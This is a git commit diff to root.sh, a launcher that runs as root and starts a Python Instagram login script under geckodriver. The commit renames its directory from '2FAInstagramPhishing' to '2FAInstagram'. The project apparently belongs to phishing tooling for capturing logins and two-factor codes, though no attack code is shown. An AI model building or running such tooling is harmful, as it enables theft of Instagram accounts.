0ea2de97550e6c140183e6269558fe86cefd1433
Alejandro Fernández <alejandrofernandezb92@gmail.com>
2020-01-08 12:41:12 +0100

    Update root.sh

--- root.sh
+++ root.sh
@@ -1,6 +1,6 @@
 #!/bin/sh
 # script that runs as root
 # The display number must be a desktop session valid, you can view with echo $DISPLAY
-export PATH=$PATH:/root/2FAInstagramPhishing/geckodriver
-DISPLAY=:1 python /root/2FAInstagramPhishing/logininstagram.py &
+export PATH=$PATH:/root/2FAInstagram/geckodriver
+DISPLAY=:1 python /root/2FAInstagram/logininstagram.py &
 
